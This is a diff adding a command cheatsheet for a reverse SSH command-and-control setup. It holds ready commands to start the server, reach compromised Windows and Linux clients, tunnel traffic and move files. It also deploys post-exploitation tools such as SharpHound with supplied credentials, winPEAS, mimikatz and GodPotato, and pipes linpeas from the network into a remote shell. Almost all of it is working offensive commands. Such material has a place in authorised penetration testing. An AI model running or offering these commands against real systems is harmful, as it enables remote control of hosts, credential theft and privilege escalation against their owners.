@@ -1,0 +1,76 @@
+% reverse ssh, rssh
+@ windows-downloads
+@ windows-variables
+
+# Start reverse ssh server
+if ! [[ -f ~/.ssh/rssh-key ]]; then ssh-keygen -t ed25519 -N '' -q -f ~/.ssh/rssh-key; fi
+docker kill rssh; docker rm rssh; sudo rm -rf rssh-data
+docker run -d -p3232:2222 -v ./rssh-data:/data -e EXTERNAL_ADDRESS=<external_ip>:3232 -e SEED_AUTHORIZED_KEYS="$(cat ~/.ssh/rssh-key.pub)" --name rssh reversessh/reverse_ssh
+
+# Connect to the reverse ssh command server
+ssh -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -p 3232 localhost
+
+# Connect to reverse ssh client
+ssh -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" <rssh-client>
+
+# Run command on reverse ssh client
+ssh -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" <rssh-client> '<command>'
+
+# Fix backspace in rssh
+Set-PSReadLineKeyHandler -Key "Ctrl+Backspace" -Function BackwardDeleteChar
+
+# RSSH: Port forward and listen remotely
+ssh -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" -N -R <remoteinterface>:<remoteport>:<localinterface>:<localport> <rssh-client>
+
+# RSSH: Port forward and listen locally
+ssh -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" -N -L <localinterface>:<localport>:<remoteinterface>:<remoteport> <rssh-client>
+
+# RSSH: Dynamic port forward
+ssh -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" -N -D 9050 <rssh-client>
+
+# RSSH: Upload file
+scp -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" '<localfile>' '<rssh-client>:<remotefile>'
+
+# RSSH: Upload to programdata
+scp -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" '<localfile>' '<rssh-client>:C:/ProgramData'
+
+# RSSH: Download file
+scp -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" '<rssh-client>:<remotefile>' '<newlocalfile>'
+
+# RSSH: run command on all clients
+ssh -i ~/.ssh/rssh-key -p 3232 localhost ls | awk '{print $3}' | while read line; do ssh -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" "$line" '<command>'; done
+
+# RSSH: run sharphound on client
+if [[ ! -f www/sh.exe ]]; then mkdir -p www; (cd www && <download_sh>); fi
+scp -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" www/sh.exe '<rssh-client>:C:/ProgramData'
+ssh -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" <rssh-client> 'C:\ProgramData\sh.exe -c All --ldapusername "<user_with_password>" --ldappassword "<password_for_user>" --zipfilename sh.zip'
+
+# RSSH: run winpeas on client
+if [[ ! -f www/peas.exe ]]; then mkdir -p www; (cd www && <download_peas>); fi
+scp -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" www/peas.exe '<rssh-client>:C:/ProgramData'
+ssh -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" <rssh-client> 'C:\ProgramData\peas.exe' | tee peas-'<rssh-client>'.log
+
+# RSSH: run linpeas on client
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | ssh -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" <rssh-client> 'sh' | tee peas-'<rssh-client>'.log
+
+# RSSH: run mimikatz on client
+if [[ ! -f www/mimikatz.exe ]]; then mkdir -p www; (cd www && <download_mimikatz>); fi
+scp -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" www/mimikatz.exe '<rssh-client>:C:/ProgramData'
+ssh -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" <rssh-client> 'C:\ProgramData\mimikatz.exe' | tee mimikatz-'<rssh-client>'.log
+
+# RSSH: upload adpeas to client
+if [[ ! -f www/adpeas.ps1 ]]; then mkdir -p www; (cd www && <download_ad_peas>); fi
+scp -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" www/adpeas.ps1 '<rssh-client>:C:/ProgramData'
+
+# RSSH: upload runascs to client
+if [[ ! -f www/runascs.exe ]]; then mkdir -p www; (cd www && <download_runas_cs>); fi
+scp -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" www/runascs.exe '<rssh-client>:C:/ProgramData'
+
+# RSSH: upload godpotato to client
+if [[ ! -f www/godpotato.exe ]]; then mkdir -p www; (cd www && <download_godpotato>); fi
+scp -o StrictHostKeyChecking=no -i ~/.ssh/rssh-key -oProxyCommand="ssh -p 3232 -i ~/.ssh/rssh-key -W %h:%p localhost" www/godpotato.exe '<rssh-client>:C:/ProgramData'
+
+$ interface: ip link show | awk -F': ' '{print $2}' | grep .
+$ external_ip: ip -f inet addr show <interface> | awk '/inet / {print $2}' | cut -d'/' -f1
+$ rssh-client: ssh -i ~/.ssh/rssh-key -p 3232 localhost ls | awk '{print $3}'
+$ localfile: find . -type f
